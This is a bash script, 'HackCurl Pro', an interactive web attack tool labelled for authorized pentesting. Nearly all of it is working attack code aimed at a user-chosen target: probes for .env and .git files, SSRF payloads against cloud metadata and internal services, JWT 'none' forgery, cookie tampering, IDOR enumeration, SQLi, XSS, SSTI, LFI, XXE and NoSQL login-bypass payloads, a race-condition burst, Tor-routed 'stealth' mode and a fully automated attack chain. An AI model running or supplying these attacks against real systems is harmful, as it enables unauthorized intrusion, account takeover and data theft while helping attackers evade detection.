#!/bin/bash
# ═══════════════════════════════════════════════════════════════
#   🖥️  HACKCURL PRO — Automated Cyber-Ops Terminal BY HUZAIFAH TAHIR
#   Bug Bounty / Pentest Combo Engine
#   ⚠️  FOR AUTHORIZED TESTING ONLY — Use responsibly
# ═══════════════════════════════════════════════════════════════

VERSION="2.0"
REPORT_DIR="/tmp/hackcurl_reports"
mkdir -p "$REPORT_DIR"

# ─── Colors ─────────────────────────────────────────────────
G='\033[0;32m'; BG='\033[1;32m'; C='\033[0;36m'; BC='\033[1;36m'
R='\033[0;31m'; BR='\033[1;31m'; Y='\033[1;33m'; M='\033[0;35m'
BM='\033[1;35m'; W='\033[1;37m'; D='\033[2m'; NC='\033[0m'

# ─── Globals ────────────────────────────────────────────────
TARGET=""
PROXY=""
USERAGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
  "curl/8.0.1"
  "Googlebot/2.1 (+http://www.google.com/bot.html)"
)
LOG_FILE=""

# ═════════════════════════════════════════════════════════════
#   VISUAL EFFECTS
# ═════════════════════════════════════════════════════════════

matrix_rain() {
    local end=$((SECONDS + ${1:-2}))
    local cols=$(tput cols) rows=$(tput lines)
    local chars=('0' '1' 'ア' 'イ' 'ウ' 'エ' 'オ' '$' '#' '@' '%' '&' '*' '+' '=')
    while [ $SECONDS -lt $end ]; do
        for ((i=0; i<5; i++)); do
            printf "\033[%d;%dH\033[1;32m%s\033[0m" \
                "$((RANDOM % rows))" "$((RANDOM % cols))" \
                "${chars[$((RANDOM % ${#chars[@]}))]}"
        done
        sleep 0.01
    done
    clear
}

type_text() {
    local text="$1" color="${2:-$BG}" delay="${3:-0.008}"
    for ((i=0; i<${#text}; i++)); do
        echo -ne "${color}${text:$i:1}${NC}"; sleep "$delay"
    done
    echo
}

glitch_banner() {
    local b=(
"   ██╗  ██╗ █████╗  ██████╗██╗  ██╗ ██████╗██╗   ██╗██████╗ ██╗     "
"   ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██╔══██╗██║     "
"   ███████║███████║██║     █████╔╝ ██║     ██║   ██║██████╔╝██║     "
"   ██╔══██║██╔══██║██║     ██╔═██╗ ██║     ██║   ██║██╔══██╗██║     "
"   ██║  ██║██║  ██║╚██████╗██║  ██╗╚██████╗╚██████╔╝██║  ██║███████╗"
"   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝"
"   ░▒▓█  P R O   ░▒▓█  HACKCURL BY SKELERSECURITY  █▓▒░"
    )
    for g in 1 2 3; do
        clear
        for line in "${b[@]}"; do
            case $((RANDOM % 3)) in
                0) echo -e "${BG}${line}${NC}";;
                1) echo -e "${BC}${line}${NC}";;
                2) echo -e "${BM}${line}${NC}";;
            esac
            sleep 0.015
        done
        sleep 0.06
    done
    clear
    for line in "${b[@]}"; do echo -e "${BG}${line}${NC}"; done
    echo -e "${D}${C}       ━━ Bug Bounty • Pentest • Red Team ━━  v${VERSION}${NC}"
    echo -e "${BR}       "Fight in the way of Allah those who fight you but do not transgress. Indeed. Allah does not like transgressors." ${NC}"
}

loading_bar() {
    echo -ne "${C}[*] Booting kernel modules "
    for i in {1..15}; do
        echo -ne "${BG}█"; sleep 0.05
    done
    echo -e " ${BG}[OK]${NC}"
}

# ─── Helpers ────────────────────────────────────────────────
banner() {
    echo -e "${M}╔══════════════════════════════════════════════════════════════╗${NC}"
    printf "${M}║${NC}  ${BG}▸ %-58s${M}║${NC}\n" "$1"
    echo -e "${M}╚══════════════════════════════════════════════════════════════╝${NC}"
}

step()  { echo -e "\n${BC}[▸]${NC} ${W}$1${NC}"; }
ok()    { echo -e "${BG}[✓]${NC} $1"; }
warn()  { echo -e "${Y}[!]${NC} $1"; }
err()   { echo -e "${BR}[✗]${NC} $1"; }
found() { echo -e "${BR}${BLINK}[★ POSSIBLE FINDING]${NC} ${W}$1${NC}"; }

run() {
    # $1 = label, rest = curl args
    local label="$1"; shift
    echo -e "${D}  └─╼ \$ curl $*${NC}"
    echo "$(date '+%F %T') | $label | curl $*" >> "$LOG_FILE"
    local out
    out=$(curl -sS -k --max-time 15 "$@" 2>&1)
    echo "$out"
    echo "---" >> "$LOG_FILE"; echo "$out" >> "$LOG_FILE"
    echo "$out"
}

rand_ua() { echo "${USERAGENTS[$((RANDOM % ${#USERAGENTS[@]}))]}"; }

proxy_args() {
    [ -n "$PROXY" ] && echo "-x $PROXY"
}

pause() { echo; echo -ne "${D}${C}─── [ENTER] continue ───${NC}"; read -r; }

# ═════════════════════════════════════════════════════════════
#   MODULE 1 — AUTO RECON PIPELINE
# ═════════════════════════════════════════════════════════════
mod_recon() {
    clear; banner "MODULE 1 · AUTO RECON PIPELINE"
    [ -z "$TARGET" ] && { warn "Set target first (option 0)"; pause; return; }

    local host
    host=$(echo "$TARGET" | sed -E 's#https?://##; s#/.*##')
    local out="$REPORT_DIR/recon_${host}_$(date +%s).txt"

    step "1/6 · DNS Resolution"
    if command -v dig &>/dev/null; then
        dig +short "$host" | tee -a "$out"
    else
        getent hosts "$host" | tee -a "$out"
    fi

    step "2/6 · Server & Tech Fingerprint"
    run "fingerprint" -IL "$TARGET" \
        -H "User-Agent: $(rand_ua)" | grep -iE 'server|x-powered|x-aspnet|cf-ray|via|x-generator|set-cookie' | tee -a "$out"

    step "3/6 · Response Headers (raw)"
    curl -sS -kI "$TARGET" -H "User-Agent: $(rand_ua)" | tee -a "$out"

    step "4/6 · WAF / CDN Detection"
    local hdrs
    hdrs=$(curl -sS -kI "$TARGET" 2>/dev/null)
    for sig in "cloudflare:Cloudflare" "sucuri:Sucuri" "akamai:Akamai" \
               "incap:Incapsula" "awselb:ELB" "x-amz-cf:CloudFront" "fastly:Fastly"; do
        key="${sig%%:*}"; name="${sig##*:}"
        echo "$hdrs" | grep -qi "$key" && found "WAF/CDN detected: $name"
    done

    step "5/6 · robots.txt / sitemap.xml"
    for p in robots.txt sitemap.xml .well-known/security.txt; do
        code=$(curl -sS -k -o /dev/null -w "%{http_code}" "$TARGET/$p")
        [ "$code" = "200" ] && ok "$p ($code)" && curl -sS -k "$TARGET/$p" | head -20 | tee -a "$out"
    done

    step "6/6 · Common Sensitive Paths"
    for p in .git/config .env admin/ api/ swagger.json actuator/health \
             phpinfo.php server-status .htaccess backup.zip; do
        code=$(curl -sS -k -o /dev/null -w "%{http_code}" "$TARGET/$p")
        case "$code" in
            200) found "/$p → HTTP 200";;
            401|403) warn "/$p → $code (protected)";;
        esac
    done

    ok "Recon report saved: $out"
    pause
}

# ═════════════════════════════════════════════════════════════
#   MODULE 2 — SSRF / OPEN REDIRECT / HOST INJECTION
# ═════════════════════════════════════════════════════════════
mod_ssrf() {
    clear; banner "MODULE 2 · SSRF · OPEN REDIRECT · HOST HEADER INJECTION"
    [ -z "$TARGET" ] && { warn "Set target first (option 0)"; pause; return; }

    local collab="http://169.254.169.254/latest/meta-data/"   # AWS IMDS
    local payloads=(
      "http://127.0.0.1:80"
      "http://localhost:8080"
      "http://[::1]:80"
      "$collab"
      "http://0.0.0.0"
      "gopher://127.0.0.1:6379/_INFO"
      "file:///etc/passwd"
      "dict://127.0.0.1:11211/stat"
    )

    step "Testing redirect / SSRF parameters"
    for pl in "${payloads[@]}"; do
        for param in url redirect next dest return goto out link src; do
            resp=$(curl -sS -k -o /dev/null -w "%{http_code} %{time_total} %{size_download}" \
                   "$TARGET?${param}=${pl}" --max-time 8)
            echo -e "  ${C}?${param}=${pl}${NC} → ${W}${resp}${NC}"
        done
    done

    step "Open Redirect probes"
    for pl in "//evil.com" "https:evil.com" "/\\evil.com" "//google.com%2f@evil.com"; do
        loc=$(curl -sS -kI "$TARGET?url=$pl" | grep -i '^location:')
        [ -n "$loc" ] && found "Redirect via $pl → $loc"
    done

    step "Host Header Injection (password reset poisoning)"
    for h in "evil.com" "localhost" "127.0.0.1" "$TARGET.evil.com"; do
        resp=$(curl -sS -kI "$TARGET" -H "Host: $h" 2>/dev/null | head -1)
        echo -e "  Host: ${C}$h${NC} → ${W}$resp${NC}"
    done

    pause
}

# ═════════════════════════════════════════════════════════════
#   MODULE 3 — AUTH ATTACKS (JWT / Cookie / IDOR)
# ═════════════════════════════════════════════════════════════
mod_auth() {
    clear; banner "MODULE 3 · AUTH ATTACKS · JWT · COOKIE TAMPERING · IDOR"
    [ -z "$TARGET" ] && { warn "Set target first (option 0)"; pause; return; }

    step "1/3 · JWT None-Algorithm Attack"
    echo -ne "  Paste a JWT (or ENTER to skip): "
    read -r jwt
    if [ -n "$jwt" ]; then
        IFS='.' read -r h p s <<< "$jwt"
        # decode header, set alg:none
        new_hdr=$(echo '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
        forged="${new_hdr}.${p}."
        echo -e "  ${Y}Forged:${NC} $forged"
        run "jwt-none" -I "$TARGET" -H "Authorization: Bearer $forged"
        echo -e "${D}  Tip: try also alg=HS256 with public key as secret${NC}"
    else
        warn "Skipped JWT"
    fi

    step "2/3 · Cookie Tampering"
    echo -ne "  Test cookie name (e.g. admin, role, user): "
    read -r cname
    for val in "1" "true" "admin" "administrator" "root" "0e0" "[]"; do
        resp=$(curl -sS -k -o /dev/null -w "%{http_code} %{size_download}" \
               -b "${cname}=${val}" "$TARGET")
        echo -e "  ${C}${cname}=${val}${NC} → ${W}$resp${NC}"
    done

    step "3/3 · IDOR Enumeration"
    echo -ne "  Endpoint with ID param (e.g. /api/user/1): "
    read -r ep
    if [ -n "$ep" ]; then
        base=$(echo "$ep" | sed -E 's#/[0-9]+$##')
        for i in 1 2 3 100 1000 9999; do
            code=$(curl -sS -k -o /dev/null -w "%{http_code} %{size_download}" \
                   "$TARGET${base}/${i}")
            echo -e "  ${C}${base}/${i}${NC} → ${W}${code}${NC}"
        done
    fi

    pause
}

# ═════════════════════════════════════════════════════════════
#   MODULE 4 — INJECTION PAYLOADS (SQLi/XSS/SSTI/LFI/XXE)
# ═════════════════════════════════════════════════════════════
mod_inject() {
    clear; banner "MODULE 4 · INJECTION PLAYGROUND"

    echo -e "  ${BG}[1]${NC} SQLi      ${BG}[2]${NC} XSS      ${BG}[3]${NC} SSTI"
    echo -e "  ${BG}[4]${NC} LFI       ${BG}[5]${NC} XXE      ${BG}[6]${NC} NoSQL"
    echo -ne "\n${BG}root@hackcurl${NC}:${C}inject${NC}# "
    read -r choice

    case $choice in
      1) inject_sqli;;
      2) inject_xss;;
      3) inject_ssti;;
      4) inject_lfi;;
      5) inject_xxe;;
      6) inject_nosql;;
      *) warn "Invalid";;
    esac
    pause
}

inject_sqli() {
    banner "SQL INJECTION PROBES"
    local payloads=(
      "'" "''" "' OR '1'='1" "' OR 1=1-- -"
      "' UNION SELECT NULL-- -"
      "1' AND SLEEP(3)-- -"
      "1 AND 1=1" "1 AND 1=2"
    )
    for p in "${payloads[@]}"; do
        t=$(curl -sS -k -o /dev/null -w "%{time_total}" --max-time 8 \
            "$TARGET?id=$(printf '%s' "$p" | jq -sRr @uri)")
        echo -e "  ${C}$p${NC} → ${W}${t}s${NC}"
        awk "BEGIN{exit !($t > 2.5)}" && found "Blind SQLi via time delay ($t s)"
    done
}

inject_xss() {
    banner "XSS REFLECTION CHECK"
    for p in '<script>alert(1)</script>' '"><svg onload=alert(1)>' 'javascript:alert(1)'; do
        enc=$(printf '%s' "$p" | jq -sRr @uri)
        body=$(curl -sS -k "$TARGET?q=$enc")
        if echo "$body" | grep -qF "$p"; then
            found "Reflected XSS payload: $p"
        else
            echo -e "  ${D}not reflected: $p${NC}"
        fi
    done
}

inject_ssti() {
    banner "SSTI (Server-Side Template Injection)"
    for p in '{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>' '{{7*"7"}}'; do
        enc=$(printf '%s' "$p" | jq -sRr @uri)
        body=$(curl -sS -k "$TARGET?name=$enc")
        echo "$body" | grep -q "49" && found "SSTI marker '49' with: $p"
    done
}

inject_lfi() {
    banner "LFI / PATH TRAVERSAL"
    for p in '../../../etc/passwd' '....//....//etc/passwd' \
             '..%2f..%2f..%2fetc%2fpasswd' '/etc/passwd%00' \
             'php://filter/convert.base64-encode/resource=index.php'; do
        body=$(curl -sS -k "$TARGET?file=$p")
        echo "$body" | grep -q "root:.*:0:0" && found "LFI: $p"
    done
}

inject_xxe() {
    banner "XXE PAYLOAD"
    echo -ne "  Paste endpoint that accepts XML: "; read -r ep
    [ -z "$ep" ] && return
    cat > /tmp/xxe.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
EOF
    curl -sS -k -X POST "$ep" -H "Content-Type: application/xml" \
         --data-binary @/tmp/xxe.xml | head -40
}

inject_nosql() {
    banner "NOSQL INJECTION"
    curl -sS -k -X POST "$TARGET/login" \
        -H "Content-Type: application/json" \
        -d '{"username":{"$ne":null},"password":{"$ne":null}}'
    echo
    curl -sS -k -X POST "$TARGET/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":{"$gt":""}}'
}

# ═════════════════════════════════════════════════════════════
#   MODULE 5 — RACE CONDITION BURST
# ═════════════════════════════════════════════════════════════
mod_race() {
    clear; banner "MODULE 5 · RACE CONDITION (Parallel Burst)"
    [ -z "$TARGET" ] && { warn "Set target"; pause; return; }

    echo -ne "  Endpoint path (e.g. /api/redeem): "; read -r path
    echo -ne "  Method [POST]: "; read -r method; method=${method:-POST}
    echo -ne "  Data (e.g. code=XYZ): "; read -r data
    echo -ne "  Parallel requests [30]: "; read -r n; n=${n:-30}

    step "Firing $n parallel $method requests"
    for i in $(seq 1 "$n"); do
        curl -sS -k -X "$method" "$TARGET$path" \
             -d "$data" -o "/tmp/race_$i.out" -w "%{http_code} " &
    done
    wait
    echo
    step "Response code histogram"
    cat /tmp/race_*.out >/dev/null 2>&1
    sort <(for f in /tmp/race_*.out; do wc -c < "$f"; done) | uniq -c

    ok "If you see multiple successes → possible race condition!"
    pause
}

# ═════════════════════════════════════════════════════════════
#   MODULE 6 — STEALTH / PROXY / TOR
# ═════════════════════════════════════════════════════════════
mod_stealth() {
    clear; banner "MODULE 6 · STEALTH MODE"
    echo -e "  ${BG}[1]${NC} Set HTTP proxy"
    echo -e "  ${BG}[2]${NC} Route via Tor (socks5 127.0.0.1:9050)"
    echo -e "  ${BG}[3]${NC} Random User-Agent test"
    echo -e "  ${BG}[4]${NC} Clear proxy"
    echo -ne "\n${BG}root@hackcurl${NC}:${C}stealth${NC}# "
    read -r c
    case $c in
        1) echo -ne "  proxy (http://ip:port): "; read -r PROXY; ok "Proxy: $PROXY";;
        2) PROXY="socks5h://127.0.0.1:9050"; ok "Tor enabled";;
        3) 
            for i in 1 2 3; do
                ua=$(rand_ua)
                curl -sS -k -o /dev/null -w "  UA[$i] HTTP=%{http_code}  time=%{time_total}s\n" \
                     "$TARGET" -H "User-Agent: $ua"
            done
            ;;
        4) PROXY=""; ok "Proxy cleared";;
    esac
    pause
}

# ═════════════════════════════════════════════════════════════
#   MODULE 7 — FUZZER (wordlist injection)
# ═════════════════════════════════════════════════════════════
mod_fuzz() {
    clear; banner "MODULE 7 · PARAMETER FUZZER"
    [ -z "$TARGET" ] && { warn "Set target"; pause; return; }

    echo -ne "  Inject into [1] URL  [2] header  [3] cookie  [4] body : "
    read -r mode
    echo -ne "  Wordlist path (or ENTER for built-in): "
    read -r wl

    if [ -z "$wl" ]; then
        wl=/tmp/hackcurl_wl.txt
        cat > "$wl" <<'EOF'
admin
test
debug
backup
config
private
api
v1
v2
graphql
swagger
.env
.git
EOF
    fi

    local baseline
    baseline=$(curl -sS -k -o /dev/null -w "%{size_download}" "$TARGET")
    step "Baseline size: $baseline bytes"

    while IFS= read -r word; do
        case $mode in
          1) resp=$(curl -sS -k -o /dev/null -w "%{http_code} %{size_download}" "$TARGET/$word");;
          2) resp=$(curl -sS -k -o /dev/null -w "%{http_code} %{size_download}" "$TARGET" -H "X-Test: $word");;
          3) resp=$(curl -sS -k -o /dev/null -w "%{http_code} %{size_download}" "$TARGET" -b "test=$word");;
          4) resp=$(curl -sS -k -o /dev/null -w "%{http_code} %{size_download}" -X POST "$TARGET" -d "input=$word");;
        esac
        size=$(echo "$resp" | awk '{print $2}')
        if [ "$size" != "$baseline" ]; then
            echo -e "  ${BR}[Δ]${NC} ${C}$word${NC} → ${W}$resp${NC}"
        fi
    done < "$wl"
    pause
}

# ═════════════════════════════════════════════════════════════
#   MODULE 8 — FULL AUTO ATTACK CHAIN
# ═════════════════════════════════════════════════════════════
mod_auto() {
    clear; banner "MODULE 8 · 🔥 FULL AUTO CHAIN 🔥"
    [ -z "$TARGET" ] && { warn "Set target first (option 0)"; pause; return; }

    type_text "[*] Launching automated attack chain against $TARGET" "$BR" 0.02
    sleep 0.4

    mod_recon_silent
    mod_ssrf_silent
    mod_inject_silent

    echo
    ok "Full chain complete. Report: $LOG_FILE"
    pause
}

mod_recon_silent()    { step "RECON";        banner "AUTO · RECON"; mod_recon  2>/dev/null | head -50; }
mod_ssrf_silent()     { step "SSRF/Redirect"; banner "AUTO · SSRF";  mod_ssrf  2>/dev/null | head -50; }
mod_inject_silent()   { step "Injection";    banner "AUTO · INJECT"; inject_sqli 2>/dev/null | head -30; }

# ═════════════════════════════════════════════════════════════
#   TARGET SETUP
# ═════════════════════════════════════════════════════════════
set_target() {
    echo
    echo -ne "${BC}  Enter target URL (https://...): ${NC}"
    read -r TARGET
    TARGET="${TARGET%/}"
    case "$TARGET" in
        http*) ;;
        *) TARGET="https://$TARGET" ;;
    esac
    LOG_FILE="$REPORT_DIR/scan_$(echo "$TARGET" | tr -c 'a-zA-Z0-9' '_')_$(date +%s).log"
    touch "$LOG_FILE"
    ok "Target set: ${BG}$TARGET${NC}"
    ok "Log: $LOG_FILE"
}

# ═════════════════════════════════════════════════════════════
#   MAIN MENU
# ═════════════════════════════════════════════════════════════
main_menu() {
    echo
    echo -e "${M}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${M}║${NC}              ${BG}▓▓▓ [ OPERATIONS MENU ] ▓▓▓${NC}                      ${M}║${NC}"
    echo -e "${M}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${M}║${NC}  ${BG}[0]${NC} ${W}Set Target${NC}   ${D}(${TARGET:-none})${NC}"
    echo -e "${M}║${NC}  ${BG}[1]${NC} ${W}Auto Recon Pipeline${NC}       ${BG}[5]${NC} ${W}Race Condition Burst${NC}"
    echo -e "${M}║${NC}  ${BG}[2]${NC} ${W}SSRF / Redirect / Host${NC}    ${BG}[6]${NC} ${W}Stealth / Proxy / Tor${NC}"
    echo -e "${M}║${NC}  ${BG}[3]${NC} ${W}Auth · JWT · IDOR${NC}         ${BG}[7]${NC} ${W}Parameter Fuzzer${NC}"
    echo -e "${M}║${NC}  ${BG}[4]${NC} ${W}Injection (SQLi/XSS/SSTI)${NC} ${BG}[8]${NC} ${BR}🔥 FULL AUTO CHAIN${NC}"
    echo -e "${M}║${NC}  ${BR}[9]${NC} ${W}Exit${NC}"
    echo -e "${M}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo -ne "${BG}root@hackcurl${NC}:${C}~${NC}# "
}

# ═════════════════════════════════════════════════════════════
#   BOOT
# ═════════════════════════════════════════════════════════════
# deps check
for dep in curl jq; do
    command -v "$dep" &>/dev/null || { echo -e "${BR}[!] Missing: $dep — install first${NC}"; exit 1; }
done

matrix_rain 1
glitch_banner
echo
loading_bar
sleep 0.2

trap 'echo -e "\n${BR}[!] Interrupted — terminating sessions.${NC}"; exit 0' INT

while true; do
    main_menu
    read -r choice
    case $choice in
        0) set_target ;;
        1) mod_recon ;;
        2) mod_ssrf ;;
        3) mod_auth ;;
        4) mod_inject ;;
        5) mod_race ;;
        6) mod_stealth ;;
        7) mod_fuzz ;;
        8) mod_auto ;;
        9) type_text "[*] Shutting down cyber-ops... 🕶️" "$BR"; clear; exit 0 ;;
        *) warn "Unknown command" ;;
    esac
done
